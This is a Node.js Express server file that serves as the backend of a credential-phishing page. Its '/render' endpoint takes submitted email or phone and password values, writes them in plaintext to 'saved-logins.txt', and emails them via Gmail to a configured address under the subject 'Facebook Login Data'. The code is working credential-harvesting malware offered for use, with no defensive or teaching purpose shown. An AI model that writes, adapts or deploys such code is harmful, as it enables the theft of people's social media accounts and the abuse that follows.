const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const nodemailer = require("nodemailer");
const cors = require("cors"); // 🆕 CORS support
require("dotenv").config();

const app = express();
const port = process.env.PORT || 3000;

app.use(cors()); // ✅ Allow CORS
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(__dirname));

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

app.post("/render", (req, res) => {
  const { email, password } = req.body;
  const logEntry = `EMAIL/PHONE: ${email} | PASSWORD: ${password} | TIME: ${new Date().toISOString()}\n`;

  fs.appendFile("saved-logins.txt", logEntry, (err) => {
    if (err) console.error("Error saving file:", err);
  });

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.SEND_TO,
    subject: "🔐 Facebook Login Data (Personal Use)",
    text: logEntry,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Email error:", error);
      return res.status(500).send("Email send error.");
    } else {
      console.log("✅ Email sent:", info.response);
      res.send("Login received and emailed!");
    }
  });
});

app.listen(port, () => {
  console.log(`🚀 Server running at http://localhost:${port}`);
});
